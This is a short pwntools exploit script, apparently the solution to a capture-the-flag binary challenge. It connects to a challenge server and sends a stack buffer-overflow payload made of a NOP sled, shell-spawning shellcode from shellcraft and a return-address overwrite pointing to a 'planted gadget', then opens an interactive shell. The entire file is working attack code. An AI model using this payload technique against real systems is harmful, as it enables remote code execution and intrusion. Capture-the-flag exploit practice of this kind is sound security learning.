import argparse

from pwn import *

parser = argparse.ArgumentParser()
parser.add_argument("address", default="127.0.0.1:8001",
                    nargs="?", help="Address of challenge")
args = parser.parse_args()
HOST, PORT = args.address.split(':')

r = remote(HOST, int(PORT))


PATH = '../challenge/handout/challenge'
#r = process(PATH, level='debug')
#r = gdb.debug(PATH, level='debug')

context(arch='amd64', os='linux')



#r.recvuntil(b'protocol\n')

# select queryOne
payload = b'\x03'

# nopsled and shellcode
shellcode = asm(shellcraft.sh())
PADDING = 88
payload += b'\x90' * (PADDING - len(shellcode))
payload += shellcode

# return address overwrite
# Planted gadget in destroyResponse:
# mov rax, rsp; add rax, 0x20; call [rax + 0x20]
retaddr = 0x00000000004019fd
payload += p64(retaddr)

r.sendline(payload)

r.interactive()
